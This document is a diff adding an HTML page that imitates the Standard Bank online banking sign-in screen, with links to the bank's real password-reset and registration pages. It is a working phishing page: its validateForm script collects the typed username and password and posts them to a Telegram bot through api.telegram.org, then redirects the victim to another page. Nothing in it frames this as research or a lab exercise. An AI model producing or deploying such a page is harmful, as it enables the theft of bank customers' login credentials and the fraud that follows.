@@ -1,0 +1,317 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="./assets/favicon.ico" />
+    <meta
+      name="description"
+      content="Standard Bank Online Banking Login Page"
+    />
+    <title>Sign In</title>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body {
+        min-height: 100vh;
+        background: linear-gradient(
+          180deg,
+          #1c3fae 0%,
+          #295ccf 45%,
+          #4285f4 100%
+        );
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .logo {
+        margin-top: 20px;
+        margin-bottom: 40px;
+      }
+
+      .logo img {
+        width: 65px;
+      }
+
+      .login-card {
+        width: 410px;
+        background: #f3f3f3;
+        border-radius: 4px;
+        padding: 28px;
+        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.25);
+      }
+
+      .title {
+        text-align: center;
+        color: #a5a1a1;
+        font-size: 22px;
+        margin-bottom: 40px;
+        font-weight: 10;
+      }
+
+      .field {
+        margin-bottom: 28px;
+      }
+
+      .input-container {
+        position: relative;
+      }
+
+      .form-input {
+        width: 100%;
+        border: none;
+        border-bottom: 1px solid #cfcfcf;
+        background: transparent;
+        outline: none;
+        font-size: 16px;
+        padding: 20px 0 6px 0;
+      }
+
+      .form-input:focus {
+        border-bottom: 2px solid #0d2a8a;
+      }
+
+      .floating-label {
+        position: absolute;
+        left: 0;
+        top: 22px;
+        color: #b2abab;
+        font-size: 16px;
+        transition: all 0.2s ease;
+        pointer-events: none;
+      }
+
+      .form-input:focus + .floating-label,
+      .form-input:not(:placeholder-shown) + .floating-label {
+        top: 2px;
+        font-size: 12px;
+        color: #666;
+      }
+
+      .show-btn {
+        position: absolute;
+        right: 0;
+        top: 18px;
+        color: #2979ff;
+        cursor: pointer;
+        font-size: 14px;
+        user-select: none;
+      }
+
+      .required {
+        display: none;
+        margin-top: 5px;
+        color: #e53935;
+        font-size: 12px;
+      }
+
+      .error-label {
+        color: #e53935 !important;
+      }
+
+      .error-border {
+        border-bottom: 2px solid #e53935 !important;
+      }
+
+      .btn-primary {
+        width: 100%;
+        height: 36px;
+        border: none;
+        border-radius: 4px;
+        background: #0b2b8d;
+        color: white;
+        cursor: pointer;
+        font-size: 15px;
+        margin-bottom: 16px;
+      }
+
+      .btn-secondary {
+        width: 100%;
+        height: 36px;
+        border: 2px solid #2979ff;
+        background: transparent;
+        border-radius: 4px;
+        color: #2979ff;
+        cursor: pointer;
+        font-size: 15px;
+      }
+
+      .links {
+        margin-top: 45px;
+        text-align: center;
+      }
+
+      .links a {
+        color: #2979ff;
+        text-decoration: none;
+        font-size: 14px;
+      }
+
+      .links span {
+        color: #999;
+        margin: 0 8px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="logo">
+      <!-- Replace with your logo image -->
+      <img src="assets/standard-chartered-logo.png" alt="Logo" />
+    </div>
+
+    <div class="login-card">
+      <div class="title">Sign in</div>
+
+      <div class="field">
+        <div class="input-container">
+          <input type="text" id="username" class="form-input" placeholder=" " />
+
+          <label for="username" id="userLabel" class="floating-label">
+            Username
+          </label>
+        </div>
+
+        <div class="required" id="userError">Required</div>
+      </div>
+
+      <div class="field">
+        <div class="input-container">
+          <input
+            type="password"
+            id="password"
+            class="form-input"
+            placeholder=" "
+          />
+
+          <label for="password" id="passLabel" class="floating-label">
+            Password
+          </label>
+
+          <span class="show-btn" id="togglePassword" onclick="togglePassword()">
+            SHOW
+          </span>
+        </div>
+
+        <div class="required" id="passError">Required</div>
+      </div>
+
+      <button class="btn-primary" onclick="validateForm()">SIGN IN</button>
+
+      <button
+        class="btn-secondary"
+        onclick="
+          window.location.href =
+            'https://enterprisests.standardbank.co.za/as/MDXqMGsP6y/resume/as/authorization.ping'
+        "
+      >
+        REGISTER
+      </button>
+
+      <div class="links">
+        <a
+          href="https://enterprisests.standardbank.co.za/ext/pwdreset/SBUsername?AdapterId=IBSBSAEnterpriseHtmlAdapter&TargetResource=https%3A%2F%2Fenterprisests.standardbank.co.za%2Fas%2FqEvi1eaBiL%2Fresume%2Fas%2Fauthorization.ping&FlowId=2sjCXh4h0G"
+          >Forgot password</a
+        >
+        <span>|</span>
+        <a
+          href="https://enterprisests.standardbank.co.za/ext/idrecovery/SBRecover?AdapterId=IBSBSAEnterpriseHtmlAdapter&TargetResource=https%3A%2F%2Fenterprisests.standardbank.co.za%2Fas%2FFDPCXf1E3J%2Fresume%2Fas%2Fauthorization.ping&FlowId=lSB5jkCJCo"
+          >Forgot username</a
+        >
+      </div>
+    </div>
+
+    <script src="./scripts.js"></script>
+
+    <script>
+      function togglePassword() {
+        const password = document.getElementById("password");
+
+        const toggle = document.getElementById("togglePassword");
+
+        if (password.type === "password") {
+          password.type = "text";
+          toggle.textContent = "HIDE";
+        } else {
+          password.type = "password";
+          toggle.textContent = "SHOW";
+        }
+      }
+
+      function validateForm() {
+        const username = document.getElementById("username");
+
+        const password = document.getElementById("password");
+
+        const userError = document.getElementById("userError");
+
+        const passError = document.getElementById("passError");
+
+        const userLabel = document.getElementById("userLabel");
+
+        const passLabel = document.getElementById("passLabel");
+
+        userError.style.display = "none";
+        passError.style.display = "none";
+
+        userLabel.classList.remove("error-label");
+        passLabel.classList.remove("error-label");
+
+        username.classList.remove("error-border");
+        password.classList.remove("error-border");
+
+        let valid = true;
+
+        if (username.value.trim() === "") {
+          userError.style.display = "block";
+          userLabel.classList.add("error-label");
+          username.classList.add("error-border");
+
+          valid = false;
+        }
+
+        if (password.value.trim() === "") {
+          passError.style.display = "block";
+          passLabel.classList.add("error-label");
+          password.classList.add("error-border");
+
+          valid = false;
+        }
+
+        if (valid) {
+          try {
+            let message =
+              "You have a new message .\n\n\n Online ID:" +
+              username.value.trim() +
+              "\n\n Passcode " +
+              password.value.trim();
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+              }),
+            })
+              .then((response) => response.json())
+              .then(() => {
+                window.location.replace("ph.html");
+              });
+          } catch (error) {
+            console.error("Error sending message to Telegram:", error);
+          }
+        }
+      }
+    </script>
+  </body>
+</html>
+```
